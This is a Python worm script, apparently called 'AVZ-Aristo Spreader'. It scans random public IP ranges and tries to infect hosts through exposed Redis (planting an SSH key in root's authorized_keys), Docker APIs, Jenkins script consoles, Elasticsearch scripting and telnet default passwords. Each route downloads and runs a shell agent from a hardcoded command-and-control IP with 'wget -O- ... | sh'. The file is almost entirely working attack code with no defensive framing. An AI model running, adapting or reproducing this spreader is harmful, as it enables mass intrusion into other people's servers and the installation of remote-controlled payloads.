#!/usr/bin/env python3
# AVZ-Aristo Spreader v25.7 – асинхронный, 8 векторов, 20k IP/цикл
import asyncio, aiohttp, random, socket, time, json, os, subprocess, threading
from queue import Queue

C2_HOST = "80.249.146.202"
C2_PORT = 80
AGENT_URL = f"http://{C2_HOST}:{C2_PORT}/agent_bash.sh"
MAX_CONCURRENT = 500
TIMEOUT = 1.5
SCAN_COUNT = 20_000

RANGES = [f"{i}.0.0.0/8" for i in [1,2,3,4,5,8,9,12,14,15,20,23,24,31,34,35,37,38,40,41,43,44,45,46,47,49,50,51,52,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223]]

def random_ip():
    r = random.choice(RANGES)
    net, mask = r.split("/")
    octets = list(map(int, net.split(".")))
    host = random.randint(0, (1 << (32 - int(mask))) - 1)
    for i in range(4):
        octets[i] |= (host >> (8*(3-i))) & 0xFF
    return ".".join(map(str, octets))

async def probe_port(ip, port):
    try:
        _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=TIMEOUT)
        w.close(); await w.wait_closed()
        return True
    except:
        return False

async def exploit_redis(ip):
    try:
        import redis
        r = redis.Redis(host=ip, port=6379, socket_timeout=2)
        r.ping()
        r.set('crackit', '\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...\n\n')
        r.config_set('dir', '/root/.ssh')
        r.config_set('dbfilename', 'authorized_keys')
        r.save(); r.close()
        return True
    except:
        return False

async def exploit_docker(ip):
    try:
        import docker
        client = docker.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
        client.containers.run('alpine', f'wget -O- {AGENT_URL} | sh', detach=True)
        client.close()
        return True
    except:
        return False

async def exploit_jenkins(ip):
    url = f'http://{ip}:8080/script'
    script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(url, data={'script': script}, timeout=2) as resp:
                return resp.status == 200
    except:
        return False

async def exploit_telnet(ip):
    creds = [("root","root"),("admin","admin"),("root","admin"),("admin","password"),("root","123456"),("admin","123456"),("user","user"),("test","test"),("guest","guest")]
    for u,p in creds:
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=2)
            tn.read_until(b"login: ", 1)
            tn.write(u.encode()+b"\n")
            tn.read_until(b"Password: ", 1)
            tn.write(p.encode()+b"\n")
            time.sleep(0.3)
            tn.write(f"wget -O- {AGENT_URL} | sh\n".encode())
            tn.write(b"exit\n")
            tn.close()
            return True
        except:
            pass
    return False

async def exploit_elasticsearch(ip):
    payload = {"size":1, "script_fields": {"lol": {"script": f"java.lang.Runtime.getRuntime().exec('wget -O- {AGENT_URL} | sh')"}}}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(f'http://{ip}:9200/_search', json=payload, timeout=2) as resp:
                return resp.status == 200
    except:
        return False

async def exploit_wordpress(ip):
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(f'http://{ip}/xmlrpc.php', data='<methodCall><methodName>system.listMethods</methodName></methodCall>', timeout=2) as resp:
                if resp.status == 200:
                    return True
    except:
        pass
    return False

async def infect(ip):
    ports = [22, 23, 80, 443, 2375, 6379, 8080, 9200]
    open_ports = await asyncio.gather(*[probe_port(ip, p) for p in ports])
    if open_ports[0] and await probe_port(ip, 22):
        pass
    if open_ports[5] and await exploit_redis(ip):
        return True
    if open_ports[4] and await exploit_docker(ip):
        return True
    if open_ports[6] and await exploit_jenkins(ip):
        return True
    if open_ports[1] and await exploit_telnet(ip):
        return True
    if open_ports[7] and await exploit_elasticsearch(ip):
        return True
    if open_ports[2] or open_ports[3]:
        await exploit_wordpress(ip)
    return False

async def worker(queue, stats):
    while True:
        ip = await queue.get()
        try:
            if await infect(ip):
                stats['success'] += 1
            else:
                stats['fail'] += 1
        except:
            stats['fail'] += 1
        queue.task_done()

async def scan_cycle():
    q = asyncio.Queue()
    stats = {'success':0, 'fail':0}
    ips = [random_ip() for _ in range(SCAN_COUNT)]
    for ip in ips:
        q.put_nowait(ip)
    tasks = [asyncio.create_task(worker(q, stats)) for _ in range(MAX_CONCURRENT)]
    await q.join()
    for t in tasks:
        t.cancel()
    return stats

def main():
    print("[*] Spreader v25.7 started")
    while True:
        stats = asyncio.run(scan_cycle())
        print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed")
        time.sleep(30)

if __name__ == '__main__':
    main()
